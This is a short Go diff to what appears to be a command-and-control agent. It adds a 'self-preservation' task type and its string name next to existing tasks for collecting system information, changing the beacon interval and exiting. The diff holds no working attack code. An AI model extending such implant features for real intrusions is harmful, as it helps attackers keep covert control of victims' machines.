@@ -27,6 +27,7 @@ const (
 	TaskSysinfo  TaskType = 0x04 // Collect system information
 	TaskSleep    TaskType = 0x05 // Change beacon interval
 	TaskExit     TaskType = 0x06 // Terminate the agent
+	TaskSelfPreserve TaskType = 0x07 // Toggle self-preservation on/off
 )
 
 // String returns a human-readable name for the task type.
@@ -44,6 +45,8 @@ func (tt TaskType) String() string {
 		return "SLEEP"
 	case TaskExit:
 		return "EXIT"
+	case TaskSelfPreserve:
+		return "SELFPRESERVE"
 	default:
 		return "UNKNOWN"
 	}
